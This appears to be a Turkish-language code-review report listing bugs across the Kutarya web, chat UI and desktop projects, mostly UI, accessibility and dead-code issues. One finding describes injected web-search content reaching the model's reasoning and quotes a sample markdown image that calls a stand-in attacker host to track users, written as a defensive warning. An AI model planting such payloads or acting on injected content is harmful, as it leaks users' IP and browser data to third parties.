> firebase.json:42-48  { "source": "**", "headers": [ { "key": "Cache-Control", "value": "no-cache, no-store, must-revalidate" }, ... ] }
> firebase.json:93-101  { "source": "/assets/**", "headers": [ { "key": "Cache-Control", "value": "public,max-age=31536000,immutable" } ] }
> ls -la KutaryaChatUI/css/bundle.css -> 538446 bayt

### /dene sitemap'te yok ve paylaşım meta etiketleri eksik
`D:/Kutarya/KutaryaAIWeb/public/sitemap.xml`:1

/dene, anonim ziyaretçinin yönlendirildiği tek ürün yüzeyi ve robots.txt onu taramaya açık bırakıyor (Allow: /), ama sitemap.xml'de listelenmiyor. Ayrıca deneme.html'de canonical, og:title/og:description/og:image ve twitter kartı yok — React tarafındaki her sayfa için bunlar App.jsx:321-337'de titizlikle güncellenirken deneme sayfası dışarıda kalmış. Bağlantı paylaşıldığında önizlemesiz, arama motorunda kanonik adressiz görünüyor.

> sitemap.xml <loc> listesi: /, /pricing, /indir, /contact, /legal*, /account-deletion  — /dene yok
> robots.txt: 'User-agent: *  Allow: /  Disallow: /api/  Disallow: /settings'
> deneme.html:10-12  <title>, <meta name="description">, <link rel="icon">  — canonical/og/twitter yok
> App.jsx:328-336  const canonicalUrl = `https://kutarya.com${pagePaths[page] || ...}`; ... og:title/og:url/twitter:title güncelleniyor

### scopeHistoryForIntent yarım kalmış: intent parametresini hiç kullanmıyor, geçmişi olduğu gibi geri veriyor
`D:/Kutarya/KutaryaAIWeb/server/services/intentRouter.js`:235

Fonksiyon adı ve imzası geçmişin intent'e göre daraltılacağını söylüyor, gövde ise intent'e hiç dokunmadan history'yi aynen döndürüyor. index.js:2424'te gerçekten çağrılıyor (safeHistory = scopeHistoryForIntent(safeHistory, intent)), yani ölü değil ama işlevsiz. Otomatik yönlendirmede bu daha çok önem taşıyor: mod seçici yokken tek sohbet içinde görsel üretimi, çeviri ve kod istekleri iç içe geçiyor; geçmiş hiç kapsamlanmadığı için önceki görsel üretimi turları çeviri/kod isteğine de bağlam olarak gidiyor.

> export function scopeHistoryForIntent(history = [], intent = {}) {
>   if (!Array.isArray(history)) return [];
>   return history;
> }
> // intent hiç okunmuyor. Çağrı: index.js:2424
> // safeHistory = scopeHistoryForIntent(safeHistory, intent);

### Otomatik yönlendirmenin yanlış-pozitifleri için hiç test yok; mevcut testler yalnız açık mod seçimini koruyor
`D:/Kutarya/KutaryaAIWeb/server/tests/modeModelMatrix.test.js`:100

Testler yalnızca kullanıcının açıkça mod seçtiği eski davranışı koruyor ('mod seçimi mesaj içeriğiyle ezilmez', 'yalnız research modu web temellendirmesi ister'). Yeni ve asıl riskli davranış — sohbetteki serbest metnin 250 kredilik görsel üretimine yönlendirilmesi — hiçbir testle korunmuyor. Ne olumlu ('kedi resmi çiz' -> image_generation) ne de olumsuz ('Görsel yapay zeka nedir?' -> chat) bir iddia var. 1. ve 5. bulgudaki regresyonlar bu yüzden sessizce girmiş ve sessizce kalıyor.

> // modeModelMatrix.test.js:100-106 — tek koruma, açık mod içindir
> test('mod seçimi mesaj içeriğiyle ezilmez', () => {
>   const deep = detectIntent('2022 tyt konularını araştır', 'deep', [], 'prime');
>   assert.equal(deep.taskType, 'deep');
> });
> // grep detectIntent server/tests/ -> mediaContext, modeModelMatrix, videoKaldirildi
> // hiçbirinde 'chat' modunda görsel yanlış-pozitifi iddiası yok

### Çıkışta /dene'ye yönlenme yarışı ve anonim /chat'te bir karelik AuthPage parlaması
`D:/Kutarya/KutaryaAIWeb/src/App.jsx`:294

İki küçük akış sorunu: (1) AccountMenu.handleLogout önce logout() bekliyor, sonra setPage('auth') ile window.location.assign('/auth') çağırıyor; ama logout sırasında onAuthStateChanged user'ı null yapınca App'in effect'i page hâlâ 'chat' olduğu için window.location.replace('/dene') çalıştırabiliyor — iki gezinme yarışıyor, kullanıcı çıkışta beklenmedik biçimde deneme sayfasında bulunabiliyor. (2) Yönlendirme effect'i render'dan SONRA çalıştığı için, renderPage() anonim kullanıcıya bir kare AuthPage çiziyor, ardından tam sayfa /dene'ye atlıyor; kullanıcı 'giriş ekranı açıldı sonra kayboldu' titremesi görüyor.

> App.jsx:294-297  if (!user && page === 'chat') { window.location.replace(KTY_US_DEMO_PATH); return; }
> App.jsx:368-371  if (gorunenSayfa === 'chat') { if (!user) return <AuthPage {...context} authMessage={authMessage} />; ... }
> AccountMenu.jsx:64-68  async function handleLogout() { await logout(); setOpen(false); setPage('auth'); }
> App.jsx:184-187  if (normalized === 'auth' && window.location.pathname !== '/auth') { window.location.assign(nextUrl); return; }

### Reasoning ham markdown olarak render ediliyor; sanitizer uzak https görsel yüklemesine izin veriyor
`D:/Kutarya/KutaryaAIWeb/src/components/MessageBubble.jsx`:672

Reasoning, yanıt metniyle aynı RichContent → marked.parse → sanitizeMarkdownHtml zincirinden geçiyor. Script/style/iframe/on* temizlendiği için klasik XSS kapalı (bu iyi). Ancak isSafeLinkHref src için de herhangi bir https adresine izin veriyor ve IMG izinli etiketler arasında. Web araması (googleSearch) açıkken sağlayıcıdan gelen sayfa içeriği modelin düşüncesine sızabilir; enjekte edilmiş bir `![](https://saldirgan/x.png?u=...)` panel açıldığında kullanıcının IP'si ve User-Agent'ıyla o adrese istek atar (piksel izleme). Reasoning, yanıt metninden farklı olarak hiçbir marka/link doğrulamasından da geçmediği için bu yüzey yeni ve daha az korumalı.

> MessageBubble.jsx:634 allowedTags içinde `'IMG'` · 659 `if ((name === 'href' || name === 'src') && !isSafeLinkHref(attr.value, name === 'src'))` · 672 `if (/^(https?:|mailto:)/i.test(href)) return true;` — src için de aynı dal · 417 `<RichContent content={message.reasoning} />`

### Mod seçici kalıntıları: yetim ModePicker bileşeni, kullanılmayan prop'lar ve hiç okunmayan localStorage anahtarı
`D:/Kutarya/KutaryaAIWeb/src/components/ModePicker.jsx`:29

ModePicker.jsx tam bir bileşen olarak duruyor ama hiçbir dosyadan import edilmiyor (src/ altında tek eşleşme kendi export satırı). ChatPage.jsx:113-116'da composerModlar hesaplanıp satır 892'de modes={composerModlar} olarak ChatComposer'a geçiriliyor; ChatComposer bunu satır 28-30'da destructure ediyor ama modes ve onModeChange gövdede hiç kullanılmıyor (yalnız selectedMode, o da satır 82'deki asla doğru olamayan video placeholder'ı için). handleModeChange (satır 335-342) 'kutarya-last-mode' anahtarını yazıyor ama bu anahtar kod tabanında hiçbir yerde OKUNMUYOR; buna bağlı rememberLastMode ayarı da firestoreService.js:529'da normalize ediliyor fakat ayar ekranında karşılığı yok — kullanıcı için etkisiz bir kalıntı. ModePicker.jsx:51 ve 64'te hâlâ 'Mod seç' metni ve aria-label'ı var.

> // ModePicker.jsx — src/ altında tek eşleşme kendi tanımı, import eden yok
> export default function ModePicker({ modes, value, onChange, ... })
> 
> // ChatComposer.jsx:28-30 — alınıyor, kullanılmıyor
> modes,
> selectedMode,
> onModeChange,
> 
> // ChatPage.jsx:340 — yazılıyor, hiçbir yerde okunmuyor
> if (settings.rememberLastMode) localStorage.setItem('kutarya-last-mode', nextMode);

### Anlamsız üçlü operatör: her iki dalı da aynı değeri döndürüyor, koşul da öncelik yüzünden etkisiz
`D:/Kutarya/KutaryaAIWeb/src/pages/ChatPage.jsx`:1369

Hem koşulun doğru hem yanlış dalı 'image_generation' döndürüyor, yani wantsImageGeneration ve text.trim() hesapları tamamen boşa gidiyor. Ayrıca || operatörü ?: 'ten önce bağladığı için ifade (wantsImageGeneration || text.trim()) ? ... şeklinde okunuyor; yazan kişi muhtemelen boş metinde farklı bir sonuç istemişti. Sunucudaki karşılığı da aynı durumda: intentRouter.js:93-96'da wantsImageGeneration(text) kontrolü yapılıyor ama if dalı ile onun altındaki return satırı birebir aynı buildIntent çağrısı. İkisi de yarım bırakılmış/terk edilmiş dallar.

> // ChatPage.jsx:1369
> return wantsImageGeneration || text.trim() ? 'image_generation' : 'image_generation';
> 
> // intentRouter.js:93-96 — aynı sorun
> if (wantsImageGeneration(text)) {
>   return buildIntent('image', 'image_generation', modelKey, 'image', 1, 'Selected image mode with image generation request.');
> }
> return buildIntent('image', 'image_generation', modelKey, 'image', 1, 'Selected image mode with image generation request.');

### Panelde yükseklik sınırı yok, --surface-2 hiç tanımlı değil, akışta her parçada tüm metin yeniden ayrıştırılıyor
`D:/Kutarya/KutaryaAIWeb/src/styles/global.css`:863

Üç küçük ama birikimli sorun: (1) `.reasoning-body`de max-height/overflow yok — uzun düşünme paneli akış sırasında zorla açık olduğu için asıl cevabı ekranın çok aşağısına itiyor, dar/mobil ekranda kullanıcı cevabı bulmak için uzun uzun kaydırmak zorunda kalıyor. (2) `.reasoning-panel` arka planı `var(--surface-2, var(--surface))` istiyor ama `--surface-2` global.css'in hiçbir yerinde tanımlı değil; her zaman yedeğe düşüyor, yani panel mesaj baloncuğuyla birebir aynı zeminde ve yalnız 1px çizgiyle ayrılıyor. (3) RichContent useMemo içeriğe bağlı olduğu için her reasoning parçasında BİRİKMİŞ metnin tamamı yeniden marked.parse + DOMParser'dan geçiyor (O(n²)); KUTARYA_THINKING_LEVEL yükseltilirse akış gözle görülür şekilde takılır.

> global.css:863-869 `.reasoning-body { padding: ...; border-top: ...; color: ...; font-size: 13.5px; line-height: 1.6; }` — max-height/overflow yok · 845 `background: var(--surface-2, var(--surface));` + `grep -n "--surface-2:" global.css` → 0 sonuç · MessageBubble.jsx:563 `const html = useMemo(() => sanitizeMarkdownHtml(marked.parse(content || '')), [content]);`

### README güncel değil — markalama adımı zaten yapılmış
`D:/Kutarya/KutaryaChatUI/README.md`:96

"Sıradaki adımlar" bölümü 1. madde olarak "şu an llama logosu ve İngilizce metinler duruyor" diyor. Logo çoktan Kutarya işaretiyle değiştirilmiş (index.html:56, viewBox 0 0 17.04 32 + --kutarya-kivilcim) ve icons.js'teki llamaLogo() artık hiçbir yerden çağrılmıyor. Ayrıca README, arayüzde "Recent conversations" listesinden söz ederken bu listenin eylem düğmelerinin görünmediğini bilmiyor.

> README.md:96-97 `1. **Markalama** — şu an llama logosu ve İngilizce metinler duruyor (birebir replika istendiği için).` ; index.html:56 `<svg ... viewBox="0 0 17.04 32" ... aria-label="Kutarya">` ; icons.js:177 `export function llamaLogo(cls = 'h-4 w-4') {` — app.js/index.html'de referansı yok

### Açık temada logo kıvılcımı, sistem koyu ise yanlış renkte çıkıyor
`D:/Kutarya/KutaryaChatUI/css/app.css`:11

Medya sorgusu ':root:not(.light)' ile korunuyor, ama kod hiçbir yerde kök öğeye 'light' sınıfı EKLEMİYOR — ui.js yalnız 'dark' sınıfını toggle'lıyor. Özgüllük ':root.dark' ile eşit (0,2,0) ve dosyada sonra geldiği için onu eziyor. Sonuç: işletim sistemi koyu temada olan bir ziyaretçi sayfayı AÇIK temaya alsa bile logo kıvılcımı koyu tema yeşiline (#35C08A) sabitlenir; beyaz zeminde tasarlanan #12946A hiç görünmez.

> app.css:9-13
>   :root { --kutarya-kivilcim: #12946A; }
>   :root.dark { --kutarya-kivilcim: #35C08A; }
>   @media (prefers-color-scheme: dark) { :root:not(.light) { --kutarya-kivilcim: #35C08A; } }
> ui.js:690  html.classList.toggle('dark', resolved === 'dark');   // 'light' sınıfı depoda hiç eklenmiyor

### app.css'teki .code-copy kuralı ölü — üretilen sınıf adı farklı
`D:/Kutarya/KutaryaChatUI/css/app.css`:29

'.code-block > .code-copy' kuralı kopyalama düğmesini hover'da göstermek için yazılmış, ama markdown.js düğmeyi '.copy-code-btn' sınıfıyla ve .code-block-header'ın içine üretiyor — 'code-copy' sınıfı depoda hiçbir yerde geçmiyor. Kural hiç eşleşmiyor; yorum satırı ('orijinalde Svelte bileşeniydi, burada elle') yarım kalmış bir işi gösteriyor.

> app.css:29-38  .code-block > .code-copy { position:absolute; ... opacity:0 } .code-block:hover > .code-copy { opacity:1 }
> markdown.js:483  '<button type="button" class="copy-code-btn" data-copy-code="" ...>'
> grep -rn "code-copy" js/ *.html → hiç sonuç yok (yalnız app.css)

### app.css'te hiçbir yerde kullanılmayan iki kural bloğu
`D:/Kutarya/KutaryaChatUI/css/app.css`:18

`.tema-dugme[data-active=...]` kuralları için projede tek bir `tema-dugme` sınıfı yok (js/ ve index.html'de grep 0) — muhtemelen başka bir Kutarya ekranından kopyalanmış. `.code-block > .code-copy` da eşleşmiyor: markdown.js kopyalama düğmesini `.copy-code-btn` sınıfı ve `.code-block-actions` sarmalayıcısı içinde üretiyor, yani doğrudan çocuk seçicisi hiç tutmuyor ve kod bloğu kopyala düğmesi için tasarlanan hover ile beliren opacity efekti çalışmıyor.

> app.css:18-25 `.tema-dugme[data-active='true'] { ... }` ; app.css:28-39 `.code-block > .code-copy { position: absolute; ... opacity: 0; }` ; markdown.js:479-483 `'<div class="code-block code-block-wrapper relative" ...' + '<div class="code-block-actions">' + '<button type="button" class="copy-code-btn" data-copy-code="" ...'`

### 'Giriş yap' bağlantısı SPA rotasıyla uyumlu ama bu statik ekranda tek başına 404, ayrıca sohbet kayboluyor
`D:/Kutarya/KutaryaChatUI/deneme.html`:126

href="/auth" adresi KutaryaAIWeb SPA'sının gerçek rotasıyla eşleşiyor (App.jsx içindeki yol tablosunda auth: '/auth'), yani aynı origin'den servis edildiğinde doğru. Ancak bu ekran kendi kökünden servis edildiğinde (dev-server.py) /auth diye bir dosya yok — 404. Ayrıca bağlantı tam sayfa gezinme yaptığı için ziyaretçinin o ana kadarki sohbeti kayboluyor ve dönüş yolu (redirect/next parametresi) yok; giriş sonrası kullanıcı denediği konuşmayı bulamıyor.

> deneme.html:126  <a id="login-link" href="/auth" ...>Giriş yap</a>
> KutaryaAIWeb/src/App.jsx:50  auth: '/auth',
> dev-server.py:32  handler = functools.partial(NoCacheHandler, directory=ROOT)   // ROOT = KutaryaChatUI, /auth yok

### /dene metinlerinde siz/sen hitap karışıklığı (aynı ekranda)
`D:/Kutarya/KutaryaChatUI/deneme.html`:103

Aynı ekranda iki hitap kipi karışık kullanılıyor: başlık/açıklama/placeholder resmî 'siz' ('Deneyin', 'Ücretsiz deneyin', 'bir şey sorun…'), kota sayacı ve sınır kutusu samimi 'sen' ('hakkın kaldı', 'mesajların bitti', 'giriş yapabilirsin'). deneme.js'teki toast ve bilgi penceresi de 'sen' kipinde. React tarafındaki tanıtım şeridi de 'sen' kipinde ('denemek ister misin?'). Ürün genelinde tek kip seçilmeli.

> deneme.html:10  <title>Kutarya Us — Deneyin</title>
> deneme.html:90  <p ...>Düşünerek cevap veren Kutarya modeli. Ücretsiz deneyin.</p>
> deneme.html:103  placeholder="Kutarya Us'a bir şey sorun…"
> deneme.js:91  `${kalan} ücretsiz mesaj hakkın kaldı`
> deneme.html:124-125  'Ücretsiz deneme mesajların bitti.' / 'giriş yapabilirsin.'
> deneme.js:294  toast('Yanıt alınamadı. Lütfen tekrar dene.', 'error')

### Akan yanıt ekran okuyucuya duyurulmuyor; DOM-SPEC'teki canlı bölge boş duruyor
`D:/Kutarya/KutaryaChatUI/index.html`:226

#messages'te role="log" veya aria-live yok; asistan yanıtı innerHTML ile parça parça yazıldığı için ekran okuyucu hiçbir şey duyurmuyor. DOM-SPEC §1'den kopyalanan `<section aria-live="polite" aria-label="Notifications alt+T">` index.html'de duruyor ama içine hiçbir zaman bir şey yazılmıyor (grep: js'te referansı yok). Toast'lar ise #toast-root'a basılıyor; kap üzerinde aria-live YOK, aria-live her toast öğesinin KENDİSİNE ekleniyor — canlı bölge içerik değişmeden önce DOM'da bulunmadığı için duyurulma garanti değil.

> index.html:120 `<div id="messages"></div>` (role/aria-live yok) ; index.html:226 `<section aria-live="polite" aria-label="Notifications alt+T" class="svelte-nbs0zk" tabindex="-1"></section>` ; index.html:229 `<div id="toast-root" data-toast-container class="fixed right-4 bottom-4 z-9999 ...">` ; ui.js:644-645 `el.setAttribute('role', ...); el.setAttribute('aria-live', ...)` — öğenin kendisine

### Tema düğmesi ikonu ve durumu hiç değişmiyor
`D:/Kutarya/KutaryaChatUI/js/app.js`:1559

cycleTheme light -> dark -> system arasında dönüyor ama düğmenin ikonu NAV_ITEMS'te sabit 'sun' ve index.html'de de sabit güneş SVG'si. Koyu temadayken de güneş görünüyor, aria-label hep "Toggle theme", aria-pressed/aria-checked yok. Kullanıcı hangi modda olduğunu yalnız 3 saniyelik toast'tan öğrenebiliyor ve toast ham İngilizce değeri basıyor ("Theme: system"). icons.js'te 'moon' ikonu tanımlı ama hiç kullanılmıyor.

> app.js:1559 `{ id: 'theme-toggle', label: 'Toggle theme', icon: 'sun' },` ; app.js:1628-1635 `function cycleTheme() { ... toast(\`Theme: ${next}\`); }` ; icons.js:101-102 `'moon': '<path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/>',` — hiçbir yerde çağrılmıyor.

### Her render #messages'i sıfırdan kuruyor — odak kayboluyor
`D:/Kutarya/KutaryaChatUI/js/app.js`:716

renderMessages tüm listeyi innerHTML ile yeniden basıyor. Klavyeyle bir mesajın Copy/Delete/Fork düğmesine odaklanıp Enter'a basan kullanıcı, işlemden sonra odağını <body>'ye kaptırıyor; Tab sırası başa dönüyor. Aynı şekilde Fork sonrası, mesaj silme sonrası ve her akış bitişinde odak sıfırlanıyor. Kod hiçbir yerde odağı geri yüklemiyor (dialog'ta previousFocus mekanizması var, mesaj listesinde yok).

> app.js:716-717 `dom.messages.innerHTML = parts.join('');\n  enhanceSubtree(dom.messages);` ; app.js:1155-1165 delete işlemi `render()` ile bitiyor — odak geri yükleme yok. Karşılaştırma: ui.js:940-943 dialog kapanışında `if (s.previousFocus && s.previousFocus.focus) { s.previousFocus.focus(...) }`

### Bağlam göstergesi yanıltıcı: kaba token tahmini + reasoning sayılmıyor
`D:/Kutarya/KutaryaChatUI/js/app.js`:807

estimateTokens karakter/4 varsayıyor; Türkçe metinde gerçek token sayısı bunun belirgin biçimde üzerinde çıkar, yani halka gerçekte olduğundan boş görünür. Ayrıca updateGauge yalnız m.content'i topluyor — m.reasoning (düşünme blokları, çoğu zaman cevaptan uzun) hiç sayılmıyor, ve gerçek sistem promptu yerine yalnız kullanıcının yazdığı ek talimat sayılıyor (KTY_US_SYSTEM_PROMPT ~1500 karakter, hiç hesaba katılmıyor). n_ctx 2048 iken bu fark bağlam taşmasını kullanıcıdan gizler.

> api.js:441-445 `export function estimateTokens(text) { ... return Math.ceil(s.length / 4); }` ; app.js:807-810 `if (settings.systemPrompt) used += estimateTokens(settings.systemPrompt);\n  if (conv) { for (const m of conv.messages) used += estimateTokens(m.content) + 4; }` — m.reasoning ve KTY_US_SYSTEM_PROMPT yok.

### New chat her tıklamada boş sohbet üretiyor
`D:/Kutarya/KutaryaChatUI/js/app.js`:1499

newChat() mevcut sohbetin zaten boş olup olmadığına bakmadan koşulsuz createConversation() çağırıyor. Düğmeye üst üste basmak veya boş bir sohbetteyken tekrar basmak, listeyi birbirinin aynı "New chat" satırlarıyla dolduruyor; bunlar localStorage'a da yazılıyor ve görünmez Delete düğmesi yüzünden temizlenemiyor.

> app.js:1499-1506 `function newChat() { if (stream) stopStream(); editingId = null; createConversation(); stickToBottom = true; render(); ... }` — mevcut sohbetin messages.length kontrolü yok.

### Başarısız tur geçmişte kalıyor ve sonraki istekte modele geri gönderiliyor
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:295

Hata sonrası asistan mesajının içeriği '_Yanıt alınamadı._' olarak ayarlanıyor ve dizide kalıyor. Bir sonraki gönderimde istek gövdesi mesajlar dizisinin tamamından kuruluyor, yani modele gerçek bir asistan cevabıymış gibi '_Yanıt alınamadı._' satırı gidiyor. Model bunu üslup örneği sanabilir; ayrıca kullanıcı için de silinemez/yeniden denenemez ölü bir satır oluyor.

> deneme.js:295-297  if (!mesajlar[asistanIndex].content) { mesajlar[asistanIndex].content = '_Yanıt alınamadı._'; }
> deneme.js:271-273  ...mesajlar.slice(0, asistanIndex).map((m) => ({ role: m.role, content: m.content })),

### Uzun mesaj için hiçbir sınır/uyarı yok; geçmiş kırpılmıyor
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:269

textarea'da maxlength yok, gönderimde uzunluk denetimi yok, bağlam doluluk göstergesi (api.js'te estimateTokens var ama bu ekranda kullanılmıyor) yok ve geçmiş hiç kırpılmıyor — her turda tüm sohbet + sistem promptu yeniden gönderiliyor. 4B'lik bir modelin bağlamı dolduğunda sunucu hata döner ve kullanıcı yine yalnız 'Yanıt alınamadı' görür, üstelik o denemede de bir hak yanar.

> deneme.js:269-274  const istek = [{ role: 'system', ... }, ...mesajlar.slice(0, asistanIndex).map(...)];   // kırpma yok
> deneme.html:100-103  <textarea id="chat-input" rows="1" ...>   // maxlength yok
> api.js:441  export function estimateTokens(text)   // deneme.js hiç çağırmıyor

### bundle.css'in beklediği --last-user-message-height hiç ayarlanmıyor
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:232

bundle.css, son asistan mesajının min-height'ını --last-user-message-height değişkenine göre hesaplıyor (fallback 19rem). Ne deneme.js ne app.js bu değişkeni yazıyor, dolayısıyla her mesaj için sabit 19rem varsayılıyor. Sonuç: kısa sorularda gereksiz boşluk, uzun sorularda ise yeni sorunun ekranın tepesine oturması bozuluyor — altaKaydir() sonrası konumlanma tutarsız görünüyor.

> bundle.css  .chat-message:last-child .chat-message-assistant.svelte-3902tz{--assistant-min-height-offset: calc( var(--last-user-message-height, 19rem) + var(--chat-form-height, 6rem) + ... )}
> grep -rn "last-user-message-height" KutaryaChatUI/js/ → hiç sonuç yok

### Fork edilen sohbet orijinaliyle aynı başlıkta — listede ayırt edilemiyor
`D:/Kutarya/KutaryaChatUI/js/store.js`:645

forkConversation yeni sohbete kaynak sohbetin başlığını olduğu gibi veriyor. Kenar çubuğunda birebir aynı metinli iki satır oluşuyor ve hangisinin çatal olduğunu anlamanın yolu yok (rozet, tarih, "(fork)" eki yok). Rename düğmeleri de görünmez olduğu için (bkz. diğer bulgu) kullanıcı bunları elle ayıramıyor. Toast sadece "Forked" diyor, nereye gidildiğini söylemiyor.

> store.js:643-651 `const fork = { id: uid(), title: conv.title || DEFAULT_TITLE, ... };\n  if (!fork.titleLocked) maybeAutoTitle(fork);` — maybeAutoTitle de ilk kullanıcı mesajından aynı başlığı üretir ; app.js:1172 `toast('Forked', 'success', { duration: 1500 });`

### Ekran okuyucu metni İngilizce: tamamen Türkçe sayfada 'Close'
`D:/Kutarya/KutaryaChatUI/js/ui.js`:865

openDialog'un kapatma düğmesindeki sr-only etiketi 'Close' olarak sabit. Bu diyalog /dene'de bilgi penceresi olarak kullanılıyor (deneme.js:319 bilgiAc -> openDialog), yani ekran okuyucu kullanan Türkçe ziyaretçi tüm arayüz Türkçeyken tek İngilizce komutu duyuyor. Dosyadaki tek İngilizce kullanıcı metni bu.

> ui.js:863-866  const sr = document.createElement('span');
>   addClasses(sr, 'sr-only');
>   sr.textContent = 'Close';
>   close.appendChild(sr);
> deneme.js:319  openDialog({ title: `${KTY_US.displayName} hakkında`, ... })

### Dropdown motoru ve 3 popover tetikleyicisi tamamen ölü kod
`D:/Kutarya/KutaryaChatUI/js/ui.js`:1129

ui.js'teki ~200 satırlık dropdown sistemi (portal, konumlandırma, ok tuşu gezinme, odak geri yükleme) app.js:1798'de initDropdown(document) ile bağlanıyor, ama projede tek bir `data-dropdown-menu-trigger` veya `data-dropdown-menu-content` yok (grep 0). Aynı şekilde DOM-SPEC §7'deki 3 gizli popover tetikleyicisi (command picker / prompt picker / file mention picker) index.html'de aynen duruyor ama hiçbir JS bunlara dokunmuyor; aria-hidden + pointer-events-none oldukları için görsel replika dışında hiçbir işlevleri yok.

> `grep -n "data-dropdown-menu-trigger|data-dropdown-menu-content" index.html js/app.js` => hiç eşleşme yok ; app.js:1798 `initDropdown(document);` ; index.html:139-150 üç adet `<button type="button" data-slot="popover-trigger" ... aria-hidden="true">` (Open command picker / Open prompt picker / Open file mention picker)

### Kullanilmayan ikinci bir ana surec dosyasi (main.cjs) depoda duruyor ve gercek dosyadan ayrismis
`D:/Kutarya/KutaryaDesktop/main.cjs`:43

package.json main alani 'electron/main.cjs'. Kok dizindeki main.cjs hicbir zaman yuklenmiyor ama neredeyse tam bir kopya ve ARTIK ESKI: asistan/uretim kip pencerelerini (asistanKip, uretimKip, modArama) hic bilmiyor, pencere olculeri sabit. Ayni sekilde src/ChatPanel.jsx.yedek ve src/styles.css.yedek de duruyor. Ileride 'main.cjs'te duzelttim' denip yanlis dosyanin duzenlenmesi cok kolay -- shell:openExternal gibi isleyiciler iki dosyada da ayri ayri tanimli.

> package.json:7  "main": "electron/main.cjs"
> main.cjs:43-46  width: 1440, height: 900, minWidth: 1040, minHeight: 640,    // kipsiz, sabit
> electron/main.cjs:75-78  width: asistanKip ? 460 : (uretimKip ? 1180 : 1440), ...
> main.cjs:408 ve electron/main.cjs:788 -> ayni ipcMain.handle('shell:openExternal') iki kez

### BYOK yolunda AI sohbet basligi hic uretilmiyor
`D:/Kutarya/KutaryaDesktop/src/ChatPanel.jsx`:292

Akisli (Kutarya modeli) yolda ilk yanittan sonra baslikGerekRef kontrol edilip sohbetBasligiUret ile duzgun bir baslik yaziliyor (412-417). BYOK dalinin done blogu ayni isi yapmiyor: baslikGerekRef true'da takili kalir ve sohbet, createChat'te verilen ham `metin.slice(0, 60)` basligiyla listede durur. Ayni uygulama icinde secilen modele gore sohbet listesi iki farkli goruntu veriyor.

> ChatPanel.jsx:412-417 (akisli yol)
>   if (baslikGerekRef.current) { baslikGerekRef.current = false; sohbetBasligiUret(metin).then((baslik) => { ... }); }
> ChatPanel.jsx:292-299 (BYOK yolu) -- addMessage + touchChat + onChatTouched var, baslik uretimi YOK
> ChatPanel.jsx:204  aktifChatId = await createChat(user.uid, metin.slice(0, 60) || 'Yeni sohbet');

### kayitUyari ve depolamaUyarisi bir kez cikinca oturum boyunca kapanmiyor
`D:/Kutarya/KutaryaDesktop/src/ChatPanel.jsx`:465

hata her gonder()'de temizleniyor (193) ama kayitUyari ve depolamaUyarisi hicbir yerde '' ile sifirlanmiyor ve kapatma dugmeleri yok. Gecici bir Firestore hatasi yuzunden bir kez cikan 'Mesaj kaydedilemedi...' serit, sorun duzelse bile uygulama kapanana kadar ekranda kalir ve kullaniciya hala kayit yapilamiyormus izlenimi verir. Web tarafindaki .chat-notice'in aksine (orada close-notice dugmesi var, ChatPage.jsx:281) masaustunde kapatma yok.

> ChatPanel.jsx:465  {kayitUyari && <div className="chat__error chat__error--kota">{kayitUyari}</div>}
> ChatPanel.jsx:468  {depolamaUyarisi && <div className="chat__uyari">{depolamaUyarisi}</div>}
> grep -n "setKayitUyari('')|setDepolamaUyarisi('')" src/ChatPanel.jsx -> sonuc yok
> styles.css:844-845  .chat__error { display:flex; ... } .chat__error > span { flex:1; min-width:200px; }  // ChatPanel span basmadigi icin bu kural olu

### Tanitim seridinde aria-live yok: ekran okuyucu kullanici seridin ciktigini hic duymuyor
`D:/Kutarya/KutaryaDesktop/src/ChatPanel.jsx`:472

Serit kullanici eylemi olmadan (acilista ve her 3. mesajda) kendiliginden beliriyor ama kapsayicida role="status" / aria-live="polite" yok. Ekran okuyucu odagi degistirmedigi icin duyuru yapilmaz; kullanici sekmeleyerek 'Dene / Simdi degil / Bir daha gosterme' dugmelerine tesadufen carpana kadar boyle bir seridin var oldugunu bilmez. KutaryaMark'in role="img" aria-label="Kutarya" etiketi de metnin basina fazladan 'Kutarya' okutur (seritte zaten 'Kutarya Us' yaziyor); dekoratif oldugu icin aria-hidden daha dogru olur.

> ChatPanel.jsx:472-479
>   <div className="chat__ktyus">
>     <div className="chat__ktyus-metin">
>       <KutaryaMark size={18} />
>       <span><strong>Kutarya Us</strong>&apos;u denemek ister misin? ...
> KutaryaLogo.jsx:33-35  role="img" aria-label={title}    // title varsayilani 'Kutarya'

### Site adresi bes ayri dosyada elle yazilmis, tek kaynak yok
`D:/Kutarya/KutaryaDesktop/src/ChatPanel.jsx`:19

Login.jsx zaten SITE_ORIGIN diye bir sabit tanimliyor ama disari acmiyor; ChatPanel, AgentPanel, Shell ve UretimKur ayni kokunu tekrar tekrar yaziyor. API tabani ise ortam degiskeniyle degistirilebiliyor (electron/main.cjs:26 KUTARYA_API_BASE) -- yani gelistirme/test ortaminda API baska yeri gosterirken 'Dene' dugmesi kullaniciyi her zaman canli siteye gonderir. Adres degisirse bes yerin de elle guncellenmesi gerekir.

> ChatPanel.jsx:19   const KTY_US_ADRES = 'https://kutarya.com/dene';
> Login.jsx:18       const SITE_ORIGIN = 'https://kutarya.com';   // export edilmiyor
> Shell.jsx:284      openExternal('https://kutarya.com/console')
> AgentPanel.jsx:278 openExternal('https://kutarya.com/pricing')
> UretimKur.jsx:151  openExternal('https://kutarya.com/pricing')
> electron/main.cjs:26  const API_BASE = process.env.KUTARYA_API_BASE || 'https://api-faferhidua-uc.a.run.app';

